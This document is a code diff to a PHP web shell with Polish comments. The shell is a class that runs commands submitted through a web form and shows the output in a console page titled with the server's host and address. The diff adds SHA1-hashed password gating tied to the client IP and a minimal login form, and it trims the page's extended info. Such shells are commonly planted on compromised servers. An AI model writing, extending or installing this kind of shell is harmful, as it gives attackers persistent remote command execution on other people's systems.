@@ -29,6 +29,16 @@ class Shell
 	const VERSION = '0.21 b110618';
 
 	/**
+	 * Dane do uwierzytelniania, jezeli wartosc jest rowna NULL, to shell nie jest chroniony haslem
+	 *
+	 * format: sha1( $user . "\xff" . $pass );
+	 *
+	 * @access public
+	 * @var    string
+	 */
+	public $sAuth;
+
+	/**
 	 * Czas generowania strony
 	 *
 	 * @access private
@@ -531,7 +541,7 @@ DATA;
 
 				$sCmd = implode( $aArgv, ' ' );
 			}
-			else if( Request::getServer( 'REQUEST_METHOD' ) !== 'POST'  )
+			else if( Request::getPost( 'cmd' ) === FALSE  )
 			{
 				$sCmd = ':ls -l ' . dirname( Request::getServer( 'SCRIPT_FILENAME' ) );
 			}
@@ -678,7 +688,7 @@ DATA;
 
 		$sContent  = sprintf( '<pre id="console">%s</pre><div>', $sConsole ) .
 		             sprintf( '<form action="%s" method="post">', Request::getCurrentUrl() ) .
-		             sprintf( '<input type="text" name="cmd" value="%s" size="110" id="cmd" />', htmlspecialchars( ( ( ( $sVal = Request::getPost( 'cmd' ) ) !== FALSE ) ? $sVal : $sCmd ) ) ) .
+		             sprintf( '<input type="text" name="cmd" value="%s" size="110" id="cmd" />', htmlspecialchars( ( ( ( $sVal = Request::getPost( 'cmd' ) ) !== FALSE ) ? $sVal : (string) $sCmd ) ) ) .
 			     '<input type="submit" name="submit" value="Execute" id="cmd-send" /></form></div>';
 
 		return $this -> getContent( $sContent );
@@ -690,22 +700,22 @@ DATA;
 	 * @uses   Request
 	 *
 	 * @access private
+	 * @param  string  $sData         Zawartosc strony
+	 * @param  boolean $bExdendedInfo [Optional]<br>Czy wyswietlac informacje o wersji PHP, zaladowanych modulach itp
 	 * @return string
 	 */
-	private function getContent( $sData )
+	private function getContent( $sData, $bExdendedInfo = TRUE )
 	{
 		$sMenu = $this -> getMenu();
 		$sGeneratedIn = sprintf( '%.5f', microtime( 1 ) - $this -> fGeneratedIn );
 		$sTitle = sprintf( 'Shell @ %s (%s)', Request::getServer( 'HTTP_HOST' ), Request::getServer( 'SERVER_ADDR' ) );
 		$sVersion = self::VERSION;
-return <<<DATA
-<!DOCTYPE HTML><html><head><title>{$sTitle}</title><meta charset="utf-8"><style>{$this -> sStyleSheet}</style></head><body>
-<div id="body">
-<div id="menu">{$sMenu}</div>
-<div id="content">{$sData}</div>
-<div id="bottom">Wygenerowano w: <strong>{$sGeneratedIn}</strong> s | Wersja: <strong>{$sVersion}</strong></div>
-</div></body></html>
-DATA;
+return "<!DOCTYPE HTML><html><head><title>{$sTitle}</title><meta charset=\"utf-8\"><style>{$this -> sStyleSheet}</style></head><body>
+<div id=\"body\">" .
+( $bExdendedInfo ? "<div id=\"menu\">{$sMenu}</div>" : NULL ) .
+"<div id=\"content\">{$sData}</div>" .
+( $bExdendedInfo ? "<div id=\"bottom\">Wygenerowano w: <strong>{$sGeneratedIn}</strong> s | Wersja: <strong>{$sVersion}</strong></div>" : NULL ) .
+"</div></body></html>";
 	}
 
 	/**
@@ -716,6 +726,28 @@ DATA;
 	 */
 	public function get()
 	{
+		/**
+		 * Uwierzytelnianie
+		 */
+		if( $this -> sAuth !== NULL )
+		{
+			session_start();
+
+			if( ! ( isset( $_SESSION['auth'] ) && ( $_SESSION['auth'] === sha1( $this -> sAuth . Request::getServer( 'REMOTE_ADDR' ) ) ) ) )
+			{
+				if( ! ( ( ( $sUser = Request::getPost( 'user') ) !== FALSE )
+				    && ( ( $sPass = Request::getPost( 'pass') ) !== FALSE )
+				    && ( $this -> sAuth === sha1( $sUser . "\xff" . $sPass ) ) )
+				)
+				{
+					echo $this -> getContent( sprintf( '<form action="%s" method="post"><input type="text" name="user" /><input type="text" name="pass" /><input type="submit" name="submit" value="Go !" /></form>', Request::getCurrentUrl() ), FALSE );
+					return ;
+				}
+
+				$_SESSION['auth'] = sha1( $this -> sAuth . Request::getServer( 'REMOTE_ADDR' ) );
+			}
+		}
+
 		/**
 		 * @todo - Tutaj ma byc edycja pliku
 		 */
